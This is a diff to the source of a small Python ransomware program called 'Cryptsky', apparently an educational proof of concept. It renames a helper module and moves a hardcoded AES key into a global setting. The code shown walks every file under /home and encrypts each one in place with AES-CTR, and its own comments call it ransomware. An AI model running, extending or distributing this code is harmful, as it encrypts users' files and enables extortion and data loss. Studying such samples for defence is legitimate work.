@@ -4,11 +4,17 @@ from Crypto.Util import Counter
 import argparse
 import os
 
-import walk
+import discover
 import modify
 
-# argparse here
-# -d, --decrypt = store true (decrypt or encrypt)
+# -----------------
+# GLOBAL VARIABLES
+# CHANGE IF NEEDED
+# -----------------
+#  set to either: '128/192/256 bit plaintext key' or False
+HARDCODED_KEY = 'yellow submarine'
+
+
 def get_parser():
     parser = argparse.ArgumentParser(description='Cryptsky')
     parser.add_argument('-d', '--decrypt', help='decrypt files [default: no]',
@@ -16,10 +22,6 @@ def get_parser():
     return parser
 
 def main():
-    # this part would not normally exist
-    # it is here to avoid the complicated key generation
-    hardcoded_key = 'yellow submarine'
-
     parser  = get_parser()
     args    = vars(parser.parse_args())
     decrypt = args['decrypt']
@@ -48,7 +50,11 @@ Your decryption key is: '{}'
         # In real ransomware, this part includes complicated key generation,
         # sending the key back to attackers and more
         # maybe I'll do that later. but for now, this will do.
-        key = hardcoded_key
+        if HARDCODED_KEY:
+            key = HARDCODED_KEY
+
+        # else:
+        #     key = random(32)
 
     ctr = Counter.new(128)
     crypt = AES.new(key, AES.MODE_CTR, counter=ctr)
@@ -57,7 +63,7 @@ Your decryption key is: '{}'
     startdirs = ['/home']
 
     for currentDir in startdirs:
-        for file in walk.discoverFiles(currentDir):
+        for file in discover.discoverFiles(currentDir):
             modify.modify_file_inplace(file, crypt.encrypt)
             #os.rename(file, file+'.Cryptsky') # append filename to indicate crypted
 
